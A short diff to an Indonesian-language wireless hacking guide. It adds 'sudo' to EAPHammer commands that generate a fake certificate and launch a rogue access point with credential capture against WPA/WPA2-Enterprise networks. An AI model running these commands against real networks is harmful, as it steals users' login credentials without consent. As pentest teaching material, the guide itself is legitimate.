@@ -53,13 +53,13 @@ Cari jaringan Wi-Fi WPA/WPA2 dengan nilai `MGT` pada kolom `AUTH`.
 #### 3. Buat sertifikat palsu:
 
 ```
-eaphammer --cert-wizard
+sudo eaphammer --cert-wizard
 ```
 
 #### 4. Jalankan EAPHammer:
 
 ```
-eaphammer -i wlan1mon --channel [channel] --auth wpa-eap --essid [essid] --creds
+sudo eaphammer -i wlan1mon --channel [channel] --auth wpa-eap --essid [essid] --creds
 ```
 
 #### 5. Set channel interface:
